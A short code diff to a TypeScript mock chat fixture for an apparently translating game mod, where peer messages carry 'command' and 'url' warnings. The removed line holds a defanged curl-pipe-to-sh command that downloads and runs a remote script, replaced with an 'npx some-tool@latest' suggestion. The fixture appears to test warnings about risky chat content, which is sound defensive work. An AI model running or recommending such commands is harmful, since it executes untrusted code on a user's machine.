@@ -37,8 +37,8 @@ const CHAT: Line[] = [
     translation: 'done',
   }),
   mine('m1', '待ち時間に誰かと話せるModを作ってます。翻訳つき'),
-  peer('p2', 'Nice! Have you tried this: curl -fsSL https[:]//example[.]com/x.sh | sh', {
-    translated: 'いいね！これ試した？ curl -fsSL https[:]//example[.]com/x.sh | sh',
+  peer('p2', 'Nice! Have you tried this: npx some-tool@latest (https[:]//example[.]com)', {
+    translated: 'いいね！これ試した？ npx some-tool@latest (https[:]//example[.]com)',
     translation: 'done',
     warnings: ['command', 'url'],
   }),
